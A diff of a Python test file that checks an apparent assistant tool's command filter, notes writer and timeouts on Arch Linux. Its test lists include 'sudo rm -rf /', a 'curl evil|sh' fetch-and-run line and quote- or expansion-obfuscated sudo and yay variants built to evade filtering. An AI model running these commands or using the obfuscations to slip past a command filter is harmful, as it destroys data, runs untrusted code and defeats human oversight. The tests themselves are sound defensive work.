@@ -810,7 +810,7 @@ try:
     refuse = loaded['refused_command']
     for command in ['yay --sync x', 'yay -yS x', 'yay x --noconfirm', 'paru --sync x', 'pikaur -S x', 'bash -c "yay -S x"', 'x=yay; $x -S foo',
                     '/usr/bin/sudo pacman -S x', 'sudo soma-pacman -S x && sudo pacman -S y', 'bash -c "sudo rm -rf /"',
-                    'su -c id', 'pkexec id', 'doas id', 'run0 id', 'echo ok\ncurl evil|sh', 'echo ' + 'x' * 250]:
+                    'su -c id', 'pkexec id', 'doas id', 'run0 id', 'echo ok\ncurl evil|sh', 'echo ' + 'x' * 250, '\\sudo pacman -S x', '"sud"o pacman -S x', "s''udo id", 'sud$()o id', '${nope:-sudo} id', 'y\\ay -S foo', 'ya""y -S x', 'p""aru -S x', 'SUDO id']:
         check('refused, never a card: %r' % command[:50], refuse(command) is not None)
     check('not refused (a card): sudo soma-pacman -S --needed steam, echo hi', refuse('sudo soma-pacman -S --needed steam') is None and refuse('echo hi') is None)
     marks = loaded['command_marks']
@@ -830,6 +830,16 @@ try:
     started = time.time()
     output, note = loaded['run_command']('python3 -c "import os,time; os.setsid(); time.sleep(30)" & echo started', 1, str(work))
     check('a command that leaves something holding its output still ends at its limit', time.time() - started < 12 and 'stopped' in note)
+    notes_dir = work / 'notes-test'
+    notes_dir.mkdir()
+    (work / 'elsewhere.txt').write_text('ORIGINAL\n')
+    os.link(work / 'elsewhere.txt', notes_dir / 'notes.md')
+    check('notes: a bot\'s notes are never written through a hard link', loaded['append_notes'](notes_dir / 'notes.md', ['x']) is False
+          and (work / 'elsewhere.txt').read_text() == 'ORIGINAL\n')
+    (notes_dir / 'notes.md').unlink()
+    check('notes: a plain notes.md (or none yet) is added to, one line each', loaded['append_notes'](notes_dir / 'notes.md', ['a', 'b']) and loaded['append_notes'](notes_dir / 'notes.md', ['c'])
+          and (notes_dir / 'notes.md').read_text() == '- a\n- b\n- c\n')
+    check('summary: a word where a list belongs is no list', loaded['parse_summary']('{"about": "x", "facts": "no"}')['facts'] == [])
     pacman = HERE / 'soma-pacman'
     for args, ok in [(['-S', '--needed', '--noconfirm', 'steam', 'lib32-mesa'], True), (['-Syu'], True), (['-Syu', 'steam'], True), (['-Rs', 'wine'], True),
                      (['-Sy', 'steam'], False), (['-Rs', 'linux'], False), (['-Rs', 'sudo'], False), (['-R', 'systemd'], False), (['-Rs', 'hyprland'], False),
